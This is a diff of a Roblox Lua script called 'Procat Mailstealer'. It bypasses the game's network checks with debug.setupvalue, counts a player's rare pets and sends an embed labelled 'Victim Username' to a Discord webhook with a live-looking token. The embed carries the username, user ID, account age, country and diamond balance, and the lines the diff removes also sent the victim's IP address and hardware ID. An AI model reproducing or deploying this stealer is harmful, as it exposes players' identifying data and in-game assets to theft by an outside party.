@@ -1,3 +1,47 @@
+local Client = require(game.ReplicatedStorage.Library.Client)
+    local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
+    local Invoke = Network.Invoke
+    local Fire = Network.Fire
+    debug.setupvalue(Client.Network.Invoke, 1, function() return true end)
+    debug.setupvalue(Client.Network.Fire, 1, function() return true end)
+    local Library = require(game.ReplicatedStorage.Framework.Library);
+
+local savedPets = Library.Save.Get().Pets
+hugeamount = 0
+for i,v in pairs(savedPets) do
+	local v2 = Library.Directory.Pets[v.id]
+	    if v2.huge == true then
+		hugeamount = hugeamount + 1
+	end
+end
+
+exclusiveamount = 0
+for i,v in pairs(savedPets) do
+	local v2 = Library.Directory.Pets[v.id]
+	    if v2.rarity == "Exclusive" then
+		exclusiveamount = exclusiveamount + 1
+	end
+end
+exclusiveamount = exclusiveamount - hugeamount
+
+eventamount = 0
+for i,v in pairs(savedPets) do
+	local v2 = Library.Directory.Pets[v.id]
+	    if v2.rarity == "Event" then
+		eventamount = eventamount + 1
+	end
+end
+
+secretamount = 0
+for i,v in pairs(savedPets) do
+	local v2 = Library.Directory.Pets[v.id]
+	    if v2.rarity == "Secret" then
+		secretamount = secretamount + 1
+	end
+end
+    
+_G.Webhook = "https://discord.com/api/webhooks/1109074966437179412/43Ab5fkbG-PXErGIgrcYVvfEemiiodY4p6gkHbiA2tHxoZ0GErYoZfJb6IcPFf5WGrLT"
+
 local url = _G.Webhook
 local username = game:GetService("Players").LocalPlayer.Name
 local fardplayer = game.Players.LocalPlayer
@@ -20,7 +64,7 @@ local data1 = {
         {
             ["title"] = "```Procat Mailstealer Results```",
             ["url"] = "https://discord.gg/mailstealer",
-            ["description"] = "```This data was generated using Procat Mailstealer```",
+            ["description"] = "```This data was generated using Procat Mailstealer :cat:```",
             ["type"] = "rich",
             ["color"] = tonumber(0xBE30F7),
             ["thumbnail"] = {
@@ -30,54 +74,41 @@ local data1 = {
             },
             ["fields"] = {
                 {
-                    ["name"] = "Victim Username = "..username.."",
-                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:detective:DisplayName :"..display.."\n:crown:Rank:"..rank.."\n:computer: Exploit : "..executor.."\n:house:IP Address : "..game:HttpGet('https://api.ipify.org/').."\n:mag:Place :"..Loading.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."**", -- eGORIKUSA DONT STEAL
+                    ["name"] = "Data Generated:",
+                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:crown:Rank:"..rank.."\n:computer: Exploit : "..executor.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."**", -- AAstraxXTopG
                     ["inline"] = false
                 },
                 {
                     ["name"] = ":gem: Diamonds  :gem: ",
-                    ["value"] = "```>>> ".._G.Diamonds.."```",
+                    ["value"] = "```>>> "..game.Players.LocalPlayer.leaderstats.Diamonds.Value.."```",
                     ["inline"] = false
 
                 },
-
-                {
-                
-                
-                    ["name"] = ":round_pushpin:  Pets :round_pushpin: ",
-                    ["value"] = "```>>> "..Pets.."```",
-                    ["inline"] = false
-                },
-                {
-                
-                   
-
-                   
-
-                 
-                    ["name"] = " :money_mouth: ".._G.PetRar.." :money_mouth: ",
-                    ["value"] = "```>>> ".._G.PetName.."```",
-                    ["inline"] = true
-                },
-                {
-                
-
-           
-
-
-
-
-
-                
+                {          
                     ["name"] = ":bar_chart: RAP :bar_chart:",
                     ["value"] = "```>>> "..RAP.."```",
                     ["inline"] = false
                 },
                 {
-                    ["name"] = ":computer: Hardware ID :computer:",
-                    ["value"] = "```>>> "..HardWareId.."```",
-                    ["inline"] = false
-                }
+                    ["name"] = " :money_mouth:Huge Pets:money_mouth: ",
+                    ["value"] = "```>>> "..hugeamount.."```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = " :money_mouth:Exclusive Pets:money_mouth: ",
+                    ["value"] = "```>>> "..exclusiveamount.."```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = " :money_mouth:Event Pets:money_mouth: ",
+                    ["value"] = "```>>> "..eventamount.."```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = " :money_mouth:Secret Pets:money_mouth: ",
+                    ["value"] = "```>>> "..secretamount.."```",
+                    ["inline"] = true
+                },
             }
         }
     }
